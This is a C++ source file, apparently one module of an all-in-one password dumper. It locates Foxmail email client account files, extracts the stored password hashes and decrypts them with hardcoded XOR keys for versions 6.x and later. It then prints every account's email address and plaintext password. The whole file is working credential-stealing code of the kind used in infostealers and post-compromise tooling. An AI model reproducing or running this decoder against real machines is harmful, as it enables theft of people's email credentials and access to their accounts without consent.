#include <string>
#include <iostream>
#include <vector>
#include <regex>
#include <windows.h>
#include <stdio.h>
#include <io.h>
#include "pwd_aio.h"
using namespace std;

static bool bVersion6 = true;


void get_foxmail_accounts(const std::string & path, std::vector<std::string> & files)
{
    //文件句柄
    long long hFile = 0;
    //文件信息，_finddata_t需要io.h头文件
    struct _finddata_t fileinfo;
    std::string p;
    int i = 0;
    if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) != -1)
    {
        do
        {
            if ((fileinfo.attrib & _A_SUBDIR))
            {
                if (strcmp(fileinfo.name, ".") != 0 && strcmp(fileinfo.name, "..") != 0){
                    // files.push_back(p.assign(path).append("\\").append(fileinfo.name));
                    files.push_back(fileinfo.name);
                }
            }
        } while (_findnext(hFile, &fileinfo) == 0);
        _findclose(hFile);
    }
}


void readAccountFile(const char* szFilePath, string & pwd_hash)
{
    HANDLE hFile = CreateFile(szFilePath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (INVALID_HANDLE_VALUE == hFile)
    {
        cout << "open file error!\n";
        CloseHandle(hFile);
        exit(0);
    }
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    byte* buffer = new byte[dwFileSize];
    ZeroMemory(buffer, dwFileSize);
    DWORD dwBytesRead = 0;
    ReadFile(hFile, buffer, dwFileSize, &dwBytesRead, NULL);
    CloseHandle(hFile);

    // 判断foxmail版本，首字节为0xD0，则为6.X版本
    if (0xD0 == buffer[0])
    {
        printf("version is 6.x!\n");
        bVersion6 = true;
    }else{
        bVersion6 = false;
    }

    // 由于byte数组中存在截断字符，不能直接转char类型
    string strText;
    for (UINT i = 0; i < dwFileSize; ++i)
    {
        if (buffer[i] > 0x20 && buffer[i] < 0x7f && buffer[i] != 0x3d)
        {
            strText += (char)buffer[i];
        }
    }

    // 使用正则匹配
    regex reg("Password\"([0-9a-fA-F]+)!");
    cmatch mt;
    regex_search(strText.c_str(), mt, reg);
    for (size_t i = 1; i < mt.size(); ++i)
    {
        // cout << "Password: ";
        // cout << mt.str(i) << endl;
    }

    int nStartIndex = strText.find("Password\"", 0);
    int nEndIndex = strText.find("!", nStartIndex);
    pwd_hash = strText.substr(nStartIndex + 9, nEndIndex - nStartIndex - 9);
    // 读取密文密码
    // nStartIndex = strText.find("POP3Password", 0);
    // nEndIndex = strText.find("POP3Port", 0);
    // string strHash = strText.substr(nStartIndex + 12, nEndIndex - nStartIndex - 12);
    //cout << strHash;
    // string strHash = "F8B2BD4DAEDE47B877B3B047A5CD749B93";
    // cout << "Hash: ";
    // cout << pwd_hash << endl;
    // cout << bVersion6 << endl;
    delete[] buffer;
}

// 核心解密算法
string decoder(bool bVersion6, string strHash)
{
    string strPlainPassword;
    // 第一步：定义不同版本的秘钥
    vector<int> a(8), b, c;
    int fc = 0;
    if (bVersion6)
    {
        a[0] = '~';
        a[1] = 'd';
        a[2] = 'r';
        a[3] = 'a';
        a[4] = 'G';
        a[5] = 'o';
        a[6] = 'n';
        a[7] = '~';
        fc = 0x5A;
    }
    else
    {
        a[0] = '~';
        a[1] = 'F';
        a[2] = '@';
        a[3] = '7';
        a[4] = '%';
        a[5] = 'm';
        a[6] = '$';
        a[7] = '~';
        fc = 0x71;
    }

    // 第二步：以字节为单位将16进制密文转成10进制
    int temp = 0;
    string section;
    for (UINT i = 0; i < strHash.length(); i += 2)
    {
        sscanf_s((strHash.substr(i, 2)).c_str(), "%x", &temp);
        b.push_back(temp);
    }

    // 第三步：将第一个元素替换成与指定数异或后的结果
    c = b;
    c[0] = c[0] ^ fc;

     // 第四步：不断扩容拷贝自身
    while (b.size() > a.size())
    {
        vector<int> expendA(2 * a.size());
        for (UINT i = 0; i < a.size(); i++)
        {
            expendA[i] = a[i];
            expendA[i + a.size()] = a[i];
        }
        a = expendA;
    }


    vector<int> d(b.size());
    for (UINT i = 1; i < b.size(); i++)
    {
        d[i - 1] = b[i] ^ a[i - 1];

    }

    vector<int> e(d.size());
    for (UINT i = 0; i < d.size() - 1; i++)
    {
        if (d[i] - c[i] < 0)
        {
            e[i] = d[i] + 255 - c[i];
        }

        else
        {
            e[i] = d[i] - c[i];
        }
        strPlainPassword += (char)e[i];
    }

    // cout << strPlainPassword << endl;
    return strPlainPassword;
}


int Get_Foxmail_Passwd(const char* foxmail_path){
    // string foxmail_exe_path = get_exe_path(FOXMAIL_EXE);
    // string foxmail_path = foxmail_exe_path.append("\\.");
    string foxmail_storage = foxmail_path;
    // sprintf(foxmail_storage, "%s\\Storage", foxmail_path);
    foxmail_storage.append("\\Storage");
    // cout << foxmail_storage << endl;

    std::vector<std::string> accounts;
    std::vector<std::string>::iterator theIterator;

    get_foxmail_accounts(foxmail_storage, accounts);
    for(theIterator = accounts.begin(); theIterator != accounts.end(); theIterator++){
        string acc_path = foxmail_storage + "\\" + *theIterator;
        string pwd_file = acc_path + "\\Accounts\\Account.rec0";
        string pwd_hash;
        readAccountFile(pwd_file.c_str(), pwd_hash);
        string pwd_plain = decoder(bVersion6, pwd_hash);

        cout << "--------------------" <<endl;
        cout << "Email   : " << *theIterator <<endl;
        cout << "Password: " << pwd_plain <<endl;
    }
    cout << "====================" << endl;
    printf("【Total: %d】\n", accounts.size());

    return accounts.size();
}
